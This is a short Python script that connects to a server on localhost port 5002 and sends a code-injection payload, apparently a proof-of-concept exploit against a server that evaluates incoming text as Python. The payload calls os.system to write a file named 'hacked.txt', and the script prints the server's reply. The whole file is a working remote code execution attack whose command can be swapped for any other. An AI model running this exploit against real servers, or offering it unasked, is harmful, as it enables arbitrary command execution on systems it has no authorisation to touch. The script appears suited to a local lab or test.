import socket

HOST = 'localhost'
PORT = 5002

# This payload will create a file named 'hacked.txt' on the server
payload = "__import__('os').system('echo HACKED > hacked.txt')"

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((HOST, PORT))
    s.sendall(payload.encode())
    data = s.recv(1024)

print('Received', repr(data))
